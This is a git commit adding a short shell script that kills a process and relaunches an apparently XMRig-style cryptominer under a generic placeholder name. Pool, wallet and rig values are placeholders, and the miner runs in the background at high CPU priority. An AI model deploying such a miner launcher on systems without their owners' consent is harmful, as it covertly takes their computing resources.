f07590da2539ee159352ca9b66f51bbcd06160a7
githobbits <52080007+githobbits@users.noreply.github.com>
2019-06-21 16:03:53 +0000

    Add files via upload

---
+++ 6.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o defaultip:defaultport -u defaultwallet --pass=x:defaultmail --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
